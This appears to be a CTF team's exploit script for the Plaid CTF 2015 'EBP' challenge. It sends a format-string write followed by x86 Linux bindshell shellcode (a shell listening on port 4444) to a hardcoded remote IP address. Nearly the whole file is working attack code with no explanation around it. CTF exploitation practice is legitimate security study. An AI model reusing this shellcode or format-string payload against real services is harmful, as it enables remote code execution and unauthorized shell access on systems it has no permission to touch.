#!/usr/bin/python
#
# Plaid CTF 2015
# EBP (PWN/160)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

from pwn import *

#
# Linux bindshell port 4444
#
buf =  ""
buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
buf += "\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51"
buf += "\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04"
buf += "\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f"
buf += "\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f"
buf += "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

host = '52.6.64.173'
#host = '127.0.0.1'
port = 4545

h = remote(host, port, timeout = None)

print "[*]Sending exploit..."
exploit = "\xA4\xA0\x04\x08%44840317x%44840317x%44840318x%n" + buf
h.send(exploit + "\n")
print "[+]Exploit sent!"
msg = h.recv(1024)
print msg

h.close()